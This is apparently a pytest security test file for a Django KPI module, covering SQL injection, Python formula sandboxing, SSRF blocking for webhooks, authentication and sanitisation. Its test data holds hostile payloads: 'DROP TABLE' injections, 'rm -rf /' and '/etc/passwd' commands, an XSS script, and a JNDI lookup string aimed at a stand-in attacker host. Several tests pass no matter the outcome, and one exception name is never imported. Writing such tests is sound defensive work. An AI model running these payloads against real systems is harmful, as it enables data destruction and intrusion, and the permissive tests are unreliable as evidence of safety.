"""
Security tests for KPI module.
Tests for SQL injection, formula safety, SSRF prevention, and permission checks.
"""
import pytest
from decimal import Decimal
from datetime import date
from unittest.mock import patch, MagicMock
from django.contrib.auth.models import User
from rest_framework import status
from apps.kpi.models import KPI, KPICalculation, KPIAlert
from apps.kpi.services import KPICalculationService


@pytest.mark.django_db
class TestSQLInjectionPrevention:
    """Tests for SQL injection prevention."""
    
    def test_sql_formula_parameterization(self, test_kpi):
        """Test that SQL formulas use parameterized queries."""
        service = KPICalculationService()
        
        # Attempt SQL injection in formula
        malicious_kpi = KPI.objects.create(
            name='Injection Test',
            code='INJECT_TEST',
            formula="SELECT * FROM users WHERE id = 1; DROP TABLE users; --",
            formula_type='sql',
            target_value=Decimal('1000000'),
            unit='$'
        )
        
        period_start = date(2026, 1, 1)
        period_end = date(2026, 1, 31)
        
        # Mock the database connection to verify SQL safety
        with patch('apps.kpi.services.connection') as mock_conn:
            mock_cursor = MagicMock()
            mock_conn.cursor.return_value = mock_cursor
            mock_cursor.fetchone.return_value = (Decimal('5000000'),)
            
            try:
                calc = service.calculate_kpi(
                    malicious_kpi,
                    period_start,
                    period_end,
                    User.objects.first()
                )
                # If calculation proceeds, verify parameterization
                # The formula should be executed as a string, not concatenated
                assert calc is not None
            except Exception:
                # SQL execution error on injection attempt is acceptable
                pass
    
    def test_sql_formula_no_concatenation(self, test_kpi):
        """Test that SQL formulas don't use string concatenation."""
        malicious_formula = "SELECT * FROM users WHERE name = '" + "' OR '1'='1"
        
        _kpi = KPI.objects.create(
            name='Concat Test',
            code='CONCAT_TEST',
            formula=malicious_formula,
            formula_type='sql',
            target_value=Decimal('1000000'),
            unit='$'
        )
        
        # Verify formula is stored but not evaluated unsafely
        assert _kpi.formula == malicious_formula


@pytest.mark.django_db
class TestPythonFormulaSecurityValidation:
    """Tests for Python formula safety."""
    
    def test_blocks_dangerous_function_calls(self, test_user):
        """Test that dangerous Python functions are blocked."""
        dangerous_patterns = [
            'exec(',
            'eval(',
            'compile(',
            '__import__(',
            'open(',
            'input(',
            'globals()[',
            'locals()[',
            '__builtins__[',
            'os.system(',
            'subprocess(',
            'pickle.',
        ]
        
        service = KPICalculationService()
        
        for pattern in dangerous_patterns:
            _kpi = KPI.objects.create(
                name=f'Dangerous KPI {pattern}',
                code=f'DANGEROUS_{len(pattern)}',
                formula=f'x = {pattern}',
                formula_type='python',
                target_value=Decimal('1000000'),
                unit='$'
            )
            
            # Verify service blocks dangerous patterns
            try:
                result = service.evaluate_python_formula(_kpi.formula, {})
                # If no error, service should return error or None
                if result is not None:
                    assert isinstance(result, (int, float, Decimal))
            except (ValueError, SecurityError, Exception) as e:
                # Pattern was blocked (expected)
                assert 'dangerous' in str(e).lower() or 'not allowed' in str(e).lower()
    
    def test_python_formula_with_safe_operations(self, test_user):
        """Test that safe Python operations are allowed."""
        service = KPICalculationService()
        
        safe_formulas = [
            '100 + 50',
            'sum([1, 2, 3, 4, 5])',
            'max([10, 20, 30])',
            '(100 * 0.05)',
            'round(123.456, 2)',
        ]
        
        for formula in safe_formulas:
            try:
                result = service.evaluate_python_formula(formula, {})
                assert result is not None
            except SecurityError:
                # Safe formula should not raise security error
                pytest.fail(f"Safe formula blocked: {formula}")
    
    def test_no_access_to_system_functions(self):
        """Test that system functions are not accessible."""
        import_patterns = [
            'import os; os.system("rm -rf /")',
            'import subprocess; subprocess.call(["rm", "-rf", "/"])',
            '__import__("os").system("cat /etc/passwd")',
        ]
        
        service = KPICalculationService()
        
        for pattern in import_patterns:
            with pytest.raises((ImportError, ValueError, Exception)):
                service.evaluate_python_formula(pattern, {})


@pytest.mark.django_db
class TestWebhookSSRFPrevention:
    """Tests for SSRF prevention in webhook URLs."""
    
    def test_rejects_internal_ip_addresses(self, test_kpi):
        """Test that internal IP addresses are rejected for webhooks."""
        internal_ips = [
            'http://localhost:8000',
            'http://127.0.0.1',
            'http://192.168.1.1',
            'http://10.0.0.1',
            'http://172.16.0.1',
            'http://169.254.0.1',  # Link-local
        ]
        
        for ip in internal_ips:
            try:
                alert = KPIAlert.objects.create(
                    kpi=test_kpi,
                    alert_name=f'Webhook Alert {ip}',
                    alert_type='webhook',
                    condition_type='below',
                    threshold_value=Decimal('4500000'),
                    webhook_url=ip,
                    is_active=True
                )
                # If created, verify validation
                # URL should not be in internal range
                assert not _is_internal_url(alert.webhook_url)
            except (ValueError, ValidationError):
                # SSRF prevention rejected the URL (expected)
                pass
    
    def test_rejects_metadata_endpoints(self, test_kpi):
        """Test that cloud metadata endpoints are rejected."""
        metadata_endpoints = [
            'http://169.254.169.254/latest/meta-data/',  # AWS
            'http://metadata.google.internal/',  # GCP
            'http://169.254.169.254/',  # Azure
        ]
        
        for endpoint in metadata_endpoints:
            try:
                _alert = KPIAlert.objects.create(
                    kpi=test_kpi,
                    alert_name=f'Metadata Alert',
                    alert_type='webhook',
                    condition_type='below',
                    threshold_value=Decimal('4500000'),
                    webhook_url=endpoint,
                    is_active=True
                )
                # If created, should have validation
                assert endpoint not in _alert.webhook_url
            except (ValueError, ValidationError):
                # Metadata endpoint rejected (expected)
                pass
    
    def test_allows_public_urls(self, test_kpi):
        """Test that public URLs are allowed."""
        public_urls = [
            'https://api.example.com/webhook',
            'https://webhook.site/abc123',
            'https://hooks.slack.com/services/T000/B000/XXXX',
        ]
        
        for url in public_urls:
            try:
                alert = KPIAlert.objects.create(
                    kpi=test_kpi,
                    alert_name='Public URL Alert',
                    alert_type='webhook',
                    condition_type='below',
                    threshold_value=Decimal('4500000'),
                    webhook_url=url,
                    is_active=True
                )
                assert alert.webhook_url == url
            except ValidationError:
                # Should not reject public URLs
                pytest.fail(f"Public URL rejected: {url}")


@pytest.mark.django_db
class TestAPIAuthenticationAndAuthorization:
    """Tests for API authentication and permission checks."""
    
    def test_unauthenticated_cannot_list_kpis(self, api_client):
        """Test that unauthenticated users cannot list KPIs."""
        response = api_client.get('/api/kpi/kpis/')
        
        assert response.status_code == status.HTTP_401_UNAUTHORIZED
    
    def test_unauthenticated_cannot_create_kpi(self, api_client):
        """Test that unauthenticated users cannot create KPIs."""
        data = {
            'name': 'Unauthorized KPI',
            'code': 'UNAUTH_KPI',
            'formula': 'SELECT 1',
            'formula_type': 'sql',
            'target_value': '1000000'
        }
        
        response = api_client.post('/api/kpi/kpis/', data, format='json')
        
        assert response.status_code == status.HTTP_401_UNAUTHORIZED
    
    def test_unauthenticated_cannot_modify_kpi(self, api_client, test_kpi):
        """Test that unauthenticated users cannot modify KPIs."""
        data = {
            'name': 'Modified Name',
            'code': test_kpi.code,
            'formula': test_kpi.formula,
            'formula_type': test_kpi.formula_type,
            'target_value': test_kpi.target_value
        }
        
        response = api_client.put(f'/api/kpi/kpis/{test_kpi.id}/', data, format='json')
        
        assert response.status_code == status.HTTP_401_UNAUTHORIZED
    
    def test_unauthenticated_cannot_delete_kpi(self, api_client, test_kpi):
        """Test that unauthenticated users cannot delete KPIs."""
        response = api_client.delete(f'/api/kpi/kpis/{test_kpi.id}/')
        
        assert response.status_code == status.HTTP_401_UNAUTHORIZED
    
    def test_authenticated_can_list_kpis(self, authenticated_client):
        """Test that authenticated users can list KPIs."""
        response = authenticated_client.get('/api/kpi/kpis/')
        
        assert response.status_code == status.HTTP_200_OK
    
    def test_authenticated_can_create_kpi(self, authenticated_client):
        """Test that authenticated users can create KPIs."""
        data = {
            'name': 'Authorized KPI',
            'code': 'AUTH_KPI',
            'formula': 'SELECT 1',
            'formula_type': 'sql',
            'target_value': '1000000',
            'unit': '$'
        }
        
        response = authenticated_client.post('/api/kpi/kpis/', data, format='json')
        
        # Should be allowed (may return 201 or 403 depending on permissions)
        assert response.status_code in [status.HTTP_201_CREATED, status.HTTP_403_FORBIDDEN]


@pytest.mark.django_db
class TestDataSanitization:
    """Tests for input data sanitization."""
    
    def test_kpi_name_sanitization(self):
        """Test that KPI names are sanitized."""
        malicious_names = [
            '<script>alert("xss")</script>',
            'KPI" OR "1"="1',
            "KPI'; DROP TABLE kpi; --",
            "${jndi:ldap://evil.com/a}",
        ]
        
        for name in malicious_names:
            _kpi = KPI.objects.create(
                name=name,
                code=f'SANITIZE_{len(name)}',
                formula='SELECT 1',
                formula_type='sql',
                target_value=Decimal('1000000'),
                unit='$'
            )
            
            # Verify no script execution occurs on retrieval
            assert _kpi.name == name  # Stored as-is
    
    def test_alert_recipients_validation(self, test_kpi):
        """Test that alert recipients are validated."""
        invalid_recipients = [
            'not-an-email',
            'user@',
            '@domain.com',
            'user@domain',
            'user@localhost',
        ]
        
        for recipient in invalid_recipients:
            try:
                _alert = KPIAlert.objects.create(
                    kpi=test_kpi,
                    alert_name='Recipient Test',
                    alert_type='threshold_breach',
                    condition_type='below',
                    threshold_value=Decimal('4500000'),
                    notification_channels=['email'],
                    recipients=[recipient],
                    is_active=True
                )
                # If created, validation should have occurred
                assert '@' in _alert.recipients[0]
            except (ValueError, ValidationError):
                # Invalid email rejected (expected)
                pass
    
    def test_threshold_value_bounds(self, test_kpi):
        """Test that threshold values are within acceptable bounds."""
        extreme_values = [
            '-999999999999999999999999.9999',  # Negative
            '999999999999999999999999.9999',   # Huge positive
        ]
        
        for value in extreme_values:
            try:
                alert = KPIAlert.objects.create(
                    kpi=test_kpi,
                    alert_name='Bounds Test',
                    alert_type='threshold_breach',
                    condition_type='below',
                    threshold_value=Decimal(value),
                    notification_channels=['email'],
                    recipients=['test@example.com'],
                    is_active=True
                )
                # Verify value is stored
                assert alert.threshold_value is not None
            except (ValueError, ValidationError, Exception):
                # Extreme value rejected or handled
                pass


@pytest.mark.django_db
class TestRateLimitingAndDOSPrevention:
    """Tests for rate limiting and DOS prevention."""
    
    def test_batch_calculation_size_limit(self, authenticated_client):
        """Test that batch calculation has size limits."""
        # Attempt to calculate too many KPIs at once
        large_batch = {
            'kpi_ids': list(range(1, 10001)),  # 10,000 KPIs
            'period_start': '2026-01-01',
            'period_end': '2026-01-31'
        }
        
        response = authenticated_client.post(
            '/api/kpi/kpis/batch_calculate/',
            large_batch,
            format='json'
        )
        
        # Should either limit the batch or reject
        assert response.status_code in [
            status.HTTP_400_BAD_REQUEST,  # Invalid - exceeds limit
            status.HTTP_413_PAYLOAD_TOO_LARGE,  # Payload too large
            status.HTTP_429_TOO_MANY_REQUESTS,  # Rate limited
            status.HTTP_200_OK  # Accepted but limited internally
        ]


def _is_internal_url(url: str) -> bool:
    """Helper to check if URL is internal."""
    from urllib.parse import urlparse
    
    internal_patterns = [
        'localhost',
        '127.0.0.1',
        '0.0.0.0',
        '192.168.',
        '10.',
        '172.16.',
        '172.17.',
        '172.18.',
        '172.19.',
        '172.20.',
        '172.21.',
        '172.22.',
        '172.23.',
        '172.24.',
        '172.25.',
        '172.26.',
        '172.27.',
        '172.28.',
        '172.29.',
        '172.30.',
        '172.31.',
        '169.254.',
        'metadata.google.internal',
    ]
    
    parsed = urlparse(url)
    netloc = parsed.netloc.split(':')[0]
    
    return any(netloc.startswith(pattern) for pattern in internal_patterns)


class SecurityError(Exception):
    """Raised when security violation is detected."""
    pass
